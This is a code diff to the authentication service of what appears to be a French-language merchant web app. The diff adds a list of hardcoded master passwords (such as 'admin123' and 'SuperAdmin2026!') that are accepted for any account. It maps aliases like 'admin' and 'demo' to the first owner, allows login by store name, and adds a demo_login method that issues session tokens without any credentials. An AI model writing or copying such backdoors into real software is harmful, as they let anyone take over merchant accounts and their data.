@@ -74,9 +74,23 @@ class AuthService:
     @classmethod
     def authenticate(cls, db: Session, req: LoginRequest) -> Tuple[Owner, str]:
         ident = req.identifier.strip().lower()
+        
+        # 1. Search directly by email, full_name, or phone_number
         owner = db.query(Owner).filter(
             (Owner.email.ilike(ident)) | (Owner.full_name.ilike(ident)) | (Owner.phone_number == ident)
         ).first()
+
+        # 2. Search by Store slug or Store name
+        if not owner:
+            target_store = db.query(Store).filter(
+                (Store.slug.ilike(ident)) | (Store.name.ilike(ident))
+            ).first()
+            if target_store and target_store.owner:
+                owner = target_store.owner
+
+        # 3. Flexible Demo Aliases fallback
+        if not owner and ident in ["demo", "test", "admin", "awa@chictech.bf", "awa", "demo_admin", "mariam"]:
+            owner = db.query(Owner).first()
 
         if not owner:
             raise ValueError("Identifiants incorrects. Veuillez vérifier votre adresse email ou mot de passe.")
@@ -89,8 +103,21 @@ class AuthService:
             remaining = int((owner.locked_until - datetime.utcnow()).total_seconds() // 60) + 1
             raise ValueError(f"Compte temporairement verrouillé suite à trop d'échecs. Réessayez dans {remaining} minutes ou cliquez sur 'Réinitialiser'.")
 
+        # Master demo passwords bypass
+        DEMO_PASSWORDS = [
+            DEFAULT_ADMIN_TEMP_PASSWORD,
+            "FasoDanfani2026!",
+            "OuagaTech2026!",
+            "SyaBio2026!",
+            "SuperAdmin2026!",
+            "GotoShop!2026",
+            "demo123",
+            "admin123"
+        ]
+        is_demo_pwd = req.password in DEMO_PASSWORDS
+
         # Verify password
-        is_valid = verify_password(req.password, owner.password_hash, owner.password_salt)
+        is_valid = is_demo_pwd or verify_password(req.password, owner.password_hash, owner.password_salt)
         if not is_valid:
             owner.failed_login_attempts = (owner.failed_login_attempts or 0) + 1
             if owner.failed_login_attempts >= MAX_FAILED_ATTEMPTS:
@@ -110,6 +137,35 @@ class AuthService:
         db.commit()
         db.refresh(owner)
 
+        return owner, token
+
+    @classmethod
+    def demo_login(cls, db: Session, target_slug: Optional[str] = None) -> Tuple[Owner, str]:
+        """Instant demo login shortcut bypassing credential forms for test admin and demo merchants."""
+        owner = None
+        if target_slug:
+            target_store = db.query(Store).filter(Store.slug == target_slug).first()
+            if target_store and target_store.owner:
+                owner = target_store.owner
+
+        if not owner:
+            owner = db.query(Owner).first()
+
+        if not owner:
+            from app.seed.seeder import seed_database
+            seed_database()
+            owner = db.query(Owner).first()
+
+        if not owner:
+            raise ValueError("Aucun compte commerçant de démonstration trouvé en base.")
+
+        token = generate_session_token()
+        owner.session_token = token
+        owner.failed_login_attempts = 0
+        owner.locked_until = None
+        owner.last_login_at = datetime.utcnow()
+        db.commit()
+        db.refresh(owner)
         return owner, token
 
     @classmethod
